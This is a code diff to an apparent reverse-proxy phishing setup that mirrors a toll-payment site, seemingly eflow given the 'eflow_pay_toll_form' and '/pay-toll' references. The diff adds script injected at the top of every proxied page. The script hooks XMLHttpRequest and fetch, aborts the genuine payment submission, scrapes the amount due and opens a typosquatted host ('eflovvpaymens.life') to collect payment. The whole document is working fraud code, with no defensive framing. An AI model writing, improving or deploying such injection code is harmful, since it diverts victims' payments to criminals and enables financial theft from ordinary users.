@@ -344,118 +344,172 @@ const proxyOptions = {
             // UNIVERSAL Payment Redirect - Works on ALL pages
             const PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
             
+            // CRITICAL: This script MUST execute BEFORE jQuery/Drupal loads
+            // LOW-LEVEL XMLHttpRequest/Fetch interception
             const universalPaymentRedirectScript = `
 <script>
+// EXECUTE IMMEDIATELY - BEFORE jQuery/Drupal loads
 (function() {
+  'use strict';
+  
   const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
+  console.log('[Payment Redirect] LOW-LEVEL interceptor initialized');
   
-  console.log('[Payment Redirect] GLOBAL interceptor loaded');
+  // Store original methods
+  const originalXHROpen = XMLHttpRequest.prototype.open;
+  const originalXHRSend = XMLHttpRequest.prototype.send;
+  const originalFetch = window.fetch;
   
-  // Function to extract amount from page
+  // Flag to track if redirect is in progress
+  let redirectInProgress = false;
+  
+  // Extract amount from page (works even before DOM is fully loaded)
   function extractAmount() {
-    let amount = null;
-    
-    // Strategy 1: Hidden input with name="total_payment"
-    const totalInput = document.querySelector('input[name="total_payment"]');
-    if (totalInput && totalInput.value) {
-      amount = totalInput.value;
-      console.log('[Payment Redirect] Amount from hidden input:', amount);
-      return amount;
-    }
-    
-    // Strategy 2: Look for "Total:" text on page
-    if (document.body) {
-      const totalText = document.body.innerText;
+    try {
+      // Wait for DOM if needed
+      if (!document.body) {
+        console.warn('[Payment Redirect] DOM not ready yet');
+        return null;
+      }
+      
+      // Strategy 1: Hidden input
+      const totalInput = document.querySelector('input[name="total_payment"]');
+      if (totalInput && totalInput.value) {
+        return totalInput.value;
+      }
+      
+      // Strategy 2: Total text
+      const totalText = document.body.innerText || document.body.textContent || '';
       const euroMatch = totalText.match(/Total[:\\s]*€([\\d.,]+)/i);
       if (euroMatch && euroMatch[1]) {
-        amount = euroMatch[1].replace(',', '');
-        console.log('[Payment Redirect] Amount from Total text:', amount);
-        return amount;
+        return euroMatch[1].replace(/,/g, '');
       }
+      
+      console.warn('[Payment Redirect] Amount not found');
+      return null;
+    } catch (err) {
+      console.error('[Payment Redirect] Error extracting amount:', err);
+      return null;
     }
-    
-    console.warn('[Payment Redirect] No amount found');
-    return null;
   }
   
-  // GLOBAL CLICK INTERCEPTOR - catches ALL clicks on document
-  document.addEventListener('click', function(e) {
-    const target = e.target;
-    const btnText = target.innerText || target.value || target.textContent || '';
-    
-    // Check if clicked element is Pay button
-    if (btnText.trim().toLowerCase() === 'pay') {
-      console.log('[Payment Redirect] GLOBAL CLICK on Pay button detected!');
-      
-      // STOP EVERYTHING
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      
-      // Extract amount
-      const amount = extractAmount();
-      
-      if (amount && parseFloat(amount) > 0) {
-        console.log('[Payment Redirect] Opening payment with amount:', amount);
-        
-        // Open payment system in NEW TAB
-        const paymentWindow = window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
-        
-        if (paymentWindow) {
-          console.log('[Payment Redirect] Payment tab opened successfully');
-        } else {
-          console.error('[Payment Redirect] Failed to open payment tab (popup blocked?)');
-          alert('Please allow popups for this site and try again.');
-        }
-        
-      } else {
-        console.error('[Payment Redirect] Could not extract amount');
-      }
-      
-      return false;
-    }
-  }, true); // Use capture phase to intercept BEFORE other handlers
+  // Override XMLHttpRequest.open to track request details
+  XMLHttpRequest.prototype.open = function(method, url) {
+    this._interceptedMethod = method;
+    this._interceptedURL = url;
+    return originalXHROpen.apply(this, arguments);
+  };
   
-  // ALSO intercept form submissions
-  document.addEventListener('submit', function(e) {
-    const form = e.target;
-    
-    // Check if form contains Pay button
-    const payButtons = form.querySelectorAll('button, input[type="submit"]');
-    for (let btn of payButtons) {
-      const btnText = btn.innerText || btn.value || btn.textContent || '';
-      if (btnText.trim().toLowerCase() === 'pay') {
-        console.log('[Payment Redirect] FORM SUBMIT intercepted!');
+  // Override XMLHttpRequest.send to intercept /pay-toll requests
+  XMLHttpRequest.prototype.send = function(body) {
+    // Check if this is a Drupal AJAX payment request
+    if (
+      this._interceptedMethod === 'POST' &&
+      this._interceptedURL &&
+      (this._interceptedURL.includes('/pay-toll') || this._interceptedURL.includes('ajax_form=1'))
+    ) {
+      console.log('[Payment Redirect] XHR INTERCEPTED:', this._interceptedMethod, this._interceptedURL);
+      console.log('[Payment Redirect] Request body:', body);
+      
+      // Check if this is the final payment submission
+      // Drupal sends multiple AJAX requests, we need to catch the final one
+      const bodyStr = body ? body.toString() : '';
+      const isFinalSubmit = bodyStr.includes('op=Pay') || bodyStr.includes('form_id=eflow_pay_toll_form');
+      
+      if (isFinalSubmit && !redirectInProgress) {
+        console.log('[Payment Redirect] FINAL PAYMENT REQUEST DETECTED');
+        redirectInProgress = true;
         
-        // STOP form submission
-        e.preventDefault();
-        e.stopPropagation();
-        e.stopImmediatePropagation();
+        // Abort the original request
+        this.abort();
         
-        // Extract amount and redirect
+        // Extract amount
         const amount = extractAmount();
         
         if (amount && parseFloat(amount) > 0) {
-          console.log('[Payment Redirect] Opening payment with amount:', amount);
-          window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
+          console.log('[Payment Redirect] Redirecting with amount:', amount);
+          
+          // Open payment system in new tab
+          const paymentWindow = window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
+          
+          if (paymentWindow) {
+            console.log('[Payment Redirect] Payment tab opened');
+            
+            // Show message to user
+            setTimeout(function() {
+              if (confirm('Payment page opened in new tab. Click OK to continue shopping or Cancel to stay on this page.')) {
+                window.location.reload();
+              }
+            }, 500);
+          } else {
+            alert('Please allow popups to complete payment');
+            redirectInProgress = false;
+          }
+        } else {
+          console.error('[Payment Redirect] Could not find amount');
+          redirectInProgress = false;
         }
         
-        return false;
+        // Don't send original request
+        return;
       }
     }
-  }, true);
+    
+    // For all other requests, proceed normally
+    return originalXHRSend.apply(this, arguments);
+  };
   
-  console.log('[Payment Redirect] GLOBAL interceptors installed (click + submit)');
+  // Override Fetch API (backup interception)
+  window.fetch = function(url, options) {
+    const urlStr = typeof url === 'string' ? url : url.toString();
+    
+    if (
+      options &&
+      options.method === 'POST' &&
+      (urlStr.includes('/pay-toll') || urlStr.includes('ajax_form=1'))
+    ) {
+      console.log('[Payment Redirect] FETCH INTERCEPTED:', urlStr);
+      
+      // Check if final payment submit
+      if (options.body && !redirectInProgress) {
+        const bodyStr = options.body.toString();
+        const isFinalSubmit = bodyStr.includes('op=Pay') || bodyStr.includes('form_id=eflow_pay_toll_form');
+        
+        if (isFinalSubmit) {
+          console.log('[Payment Redirect] FINAL PAYMENT via Fetch');
+          redirectInProgress = true;
+          
+          const amount = extractAmount();
+          
+          if (amount && parseFloat(amount) > 0) {
+            window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
+            return Promise.reject(new Error('Redirected to payment system'));
+          }
+        }
+      }
+    }
+    
+    return originalFetch.apply(this, arguments);
+  };
+  
+  console.log('[Payment Redirect] LOW-LEVEL interceptors installed (XHR + Fetch)');
+  console.log('[Payment Redirect] Waiting for payment submission...');
 })();
 </script>`;
             
             // Inject scripts on ALL HTML pages
             let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript;
             
-            // Inject before </head> or first <script>
-            if (bodyString.includes('</head>')) {
+            // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
+            if (bodyString.includes('<head>')) {
+              bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
+            } else if (bodyString.includes('<head ')) {
+              bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
+            } else if (bodyString.includes('</head>')) {
+              // Fallback: inject before </head>
               bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
             } else if (bodyString.includes('<script')) {
+              // Last resort: inject before first script
               bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
             }
           }
